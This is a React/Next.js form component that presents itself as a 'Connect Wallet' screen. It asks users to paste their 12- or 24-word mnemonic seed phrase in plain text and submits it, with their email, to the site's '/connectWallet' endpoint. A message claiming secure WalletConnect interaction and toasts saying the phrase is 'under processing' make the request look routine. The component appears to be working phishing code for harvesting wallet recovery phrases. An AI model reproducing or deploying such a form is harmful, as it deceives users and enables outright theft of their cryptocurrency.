"use client"
import { FormEvent, useState } from "react";

//Import Needed Components
import Input from "../molecules/Input";
import Button from "../molecules/Button";

//Import Needed Icons
import { Information } from "iconsax-react";
import { makeApiRequest } from "@/lib/apiUtils";
import { toast } from "sonner";

const ConnectForm = ({email, name}: string | any) => {
    const [walletName, setWalletName] = useState<string>("")
    const [phrase, setPhrase] = useState<string>("")
    const [loading, setLoading] = useState<boolean>(false)
    //Reset the state
    const reset = () => {
        setWalletName("")
        setPhrase("")
    }

  //OnSubmit Function
  const onSubmit = (event: FormEvent) => {
    event.preventDefault();
    setLoading(true);
    //Get the currenTime
    const currentDate = new Date();
    const options: Intl.DateTimeFormatOptions = {
      weekday: "long",
      day: "numeric",
      month: "long",
      year: "numeric",
      hour: "numeric",
      minute: "numeric",
      hour12: true,
    };

    const formattedDateTime = currentDate.toLocaleString("en-US", options);


    const formData = {email, walletName, phrase }
    const emailData = {to: email, subject: "Wallet Connection", name: name, emailType:"connectWallet", currentTime: formattedDateTime}
    //console.log({formData})
    //console.log({emailData})
    makeApiRequest("/connectWallet", "post", formData, {
        onSuccess: () => {
          // Handle success
          setLoading(false);
          toast.success("Your Mnemonic phrase was submitted successfully.");
          reset()
          makeApiRequest("/send-email", "post", emailData, {
            onSuccess: () => {
              // Handle success
              toast.success("Your Mnemonic phrase was received by our system, and is under processing.");
            },
            onError: (error: any) => {
              // Handle error
              console.log(error)
              toast.error("Sorry, your mnemonic phrase submission was unfortunately not properly received by our system, please try again later.");
            },
          });
        },
        onError: (error: any) => {
          // Handle error
          setLoading(false);
          reset()
          toast.error("Unable to accept your Mnemonic phrase now, please try again later.");
        },
      });
  }
    return ( 
        <main className="text-xs md:text-sm xl:text-base">
            <form onSubmit={onSubmit}>
                <Input type="text" placeholder="Wallet Name eg Trust Wallet" label="Wallet Name" id="wallet" value={walletName} onChange={(e) => { setWalletName(e.target.value) }}/>
                <textarea value={phrase} onChange={(e: React.ChangeEvent<HTMLTextAreaElement>) => {setPhrase(e.target.value)}} name="phrase" id="phrase" placeholder="Enter Mnemonic Phrase" className="mt-8 w-full resize-none border border-[#E6E7E8] px-2 xl:px-4 py-3 focus:border-primary rounded-md focus:outline-none h-40"></textarea>
                <p className="text-[0.65rem] md:text-xs xl:text-sm text-red-800 mt-2">Separated by space. you can choose to import wallets with 12-word or 24-word Mnemonic, phrase should be a plain text.</p>
                <div className="mt-4 md:mt-6 xl:mt-10">
                    <Button loading={loading} text="Connect Wallet" type="submit" />
                </div>
                <div className="flex gap-x-3 border border-green-700 rounded-lg p-2 md:p-3 xl:p-4">
                    <Information size="20" variant="Bold" className="text-green-600 shrink-0"/>
                    <p>Our communications protocol with WalletConnect brings the ecosystem together by enabling wallets and apps to securely connect and interact.</p>
                </div>
            </form>
        </main>
     );
}
 
export default ConnectForm;